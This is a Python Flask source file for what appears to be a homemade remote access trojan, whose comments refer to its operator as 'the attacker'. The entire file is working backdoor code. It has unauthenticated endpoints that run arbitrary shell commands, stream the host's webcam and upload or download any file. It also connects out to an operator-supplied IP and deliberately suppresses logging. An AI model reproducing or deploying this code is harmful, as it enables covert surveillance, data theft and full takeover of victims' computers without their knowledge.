from flask import Flask, request, render_template, jsonify, Response, send_file # For making the webserver/backend
from flask_cors import CORS # not quite sure, but it did fix an issue when I used it
import socket 
import subprocess
import os
import click, logging # used for logging: I used it to disable logging :)
import cv2

app = Flask(__name__) # Starts a Flask instance called app
CORS(app) # Absolutely no clue... but it did fix the screenshot issue

# Just some declarations so functions can share variables
ip_address = "" 
command = ""
output = ""
capture = None

'''''' # Everything under here is used for disabling logging | Not quite sure how, but it does, so don't question it...
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def secho(text, file=None, nl=None, err=None, color=None, **styles):
    pass

def echo(text, file=None, nl=None, err=None, color=None, **styles):
    pass

click.echo = echo
click.secho = secho
'''''' # Everything above here is used for disabling logging | Not quite sure how, but it does, so don't question it...



def remote_connection(): # Function that handles the connecting from the client to the attacker | Required for viewing screenshots
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Needed for initiating the sockets
    
    # try method for handling possible connection errors
    try:
        client_socket.connect((ip_address, 45923)) # Connecting to the ip_address of the client on the given port
        print("Connected to the attacker") # Little status message cause
    
    # Handles exception, nothing interesting
    except Exception as e:
        print(e)
    finally:
        client_socket.close()
        

# Function that executes the sent commands
def remote_code_execution():
    global output
    global results
    
    # The following 7 lines allow the use of the command cd /path/to/wherever 
    if command.startswith("cd "):
        new_directory = command[3:].strip() # Strips the input by taking away "cd " leaving just the directory path
    try:
        os.chdir(new_directory) # sets the new current working directory
        
    # just a little exception handling
    except Exception as e:
        pass
        
    # subprocess.run runs the command, in shell, while capturing the output from the command, in plain text.
    results = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    # Turns the output into a json serializable object so it can be displayed on the webserver
    output = {
        'stdout': results.stdout.strip(),
        'stderr': results.stderr.strip(),
        'returncode': results.returncode
    }
    

# When you connect to the webserver this is what you see first. The root page
@app.route('/')
def home():
    return render_template('index.html') # Loads the html from the template folder | Not sure why it has to be in a folder called templates, but whatever.

@app.route('/set_ip', methods=['POST']) # This is called when you click the set ip button | POST request to get the ip from the text input field

def set_ip(): # Function for getting the ip, and then connecting the attacker to the client/server
    global ip_address
    ip_address = request.json.get('ip') # Pulls the ip address from the webserver using request.json.get() | It sends a request to get the json...
    
    remote_connection() # Calls the remote_connection() function
    
    # Status messages for the webserver to handle errors, etc. Required or the webserver throws errors like crazy
    try:
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500 # Posts error message in output box when error occurs


@app.route('/send_command', methods=['POST']) # This is called when you click the send command button

def send_command(): # Function for recieving the command then sending it to the function that executes it
    global command
    command = request.json.get('command') # request to get the command from the text input field in the webserver
    
    remote_code_execution() # function for executing the command | uses subprocess.run()
    
    # again... just some status messages for the webserver so it doesn't scream at me again :(
    try:
        return jsonify({"status": "success", "output": results.stdout}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    
    
# New route to handle video streaming
def gen_frames():  # Generator function for video streaming
    global capture
    capture = cv2.VideoCapture(0)
    
    while True:
        success, frame = capture.read()  # Read the camera frame
        if not success:
            break
        else:
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')  # Flush each frame properly

@app.route('/video_feed') # event to render the webcam feed on the website
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
    
# New route for the file management page
@app.route('/file_page')
def file_page():
    return render_template('file.html')

@app.route('/upload_file', methods=['POST'])
def upload_file():
    try:
        file = request.files['file']
        directory = request.form.get('directory')  # Directory where the file will be uploaded
        
        if not os.path.exists(directory):
            os.makedirs(directory)  # Create the directory if it doesn't exist
        
        filepath = os.path.join(directory, file.filename)
        file.save(filepath)
        
        # Send back a JSON response indicating success
        return jsonify({"status": "success", "message": f"File uploaded to {filepath}"}), 200
    except Exception as e:
        # Send back a JSON response on failure
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/download_file', methods=['POST'])
def download_file():
    try:
        file_path = request.json.get('file_path')  # Get the full file path from the request
        
        if not os.path.isfile(file_path):
            return jsonify({"status": "error", "message": "File does not exist"}), 404
        
        # Serve the file as a downloadable attachment
        return send_file(file_path, as_attachment=True)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

    
# Route to serve an image from any directory on the system
@app.route('/view_image', methods=['POST'])
def view_image():
    try:
        file_path = request.json.get('file_path')  # Get the full file path from the request
        
        if not os.path.isfile(file_path):  # Check if the file exists
            return jsonify({"status": "error", "message": "File does not exist"}), 404
        
        return send_file(file_path, mimetype='image/jpeg')  # Serve the image file
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    
# Beginning of the script
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=45920) # Starts the webserver/script | Listens on all interfaces, and is on port 45920